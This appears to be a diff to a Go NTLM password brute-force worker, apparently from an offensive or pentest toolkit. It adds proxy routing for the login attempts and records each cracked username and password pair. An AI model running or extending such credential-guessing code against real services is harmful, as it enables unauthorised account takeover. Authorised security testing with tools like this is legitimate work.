@@ -4,6 +4,7 @@ import (
 	"crypto/tls"
 	"github.com/Azure/go-ntlmssp"
 	"net/http"
+	"net/url"
 	"time"
 )
 
@@ -23,12 +24,20 @@ func NtlmBruteWorker(info *TaskInfo) {
 						InsecureSkipVerify: true,
 						Renegotiation:      tls.RenegotiateOnceAsClient,
 					},
+					Proxy: func(_ *http.Request) (*url.URL, error) {
+						if info.proxy != "" {
+							return url.Parse(info.proxy)
+						} else {
+							return nil, nil
+						}
+					},
 				},
 			},
 			CheckRedirect: func(req *http.Request, via []*http.Request) error {
 				return http.ErrUseLastResponse
 			},
 		}
+
 		req, _ := http.NewRequest("GET", info.u, nil)
 		req.SetBasicAuth(info.domain+"\\"+username, password)
 		res, err := client.Do(req)
@@ -37,7 +46,7 @@ func NtlmBruteWorker(info *TaskInfo) {
 		}
 		if res.StatusCode != 401 && res.StatusCode != 408 && res.StatusCode != 504 {
 			Log.Success("[+] 成功: %v", username+":"+password)
-			info.done.Set(username)
+			info.done.Set(username, password, info.o)
 		} else {
 			Log.Failed("[-] 失败: %v", username+":"+password)
 		}
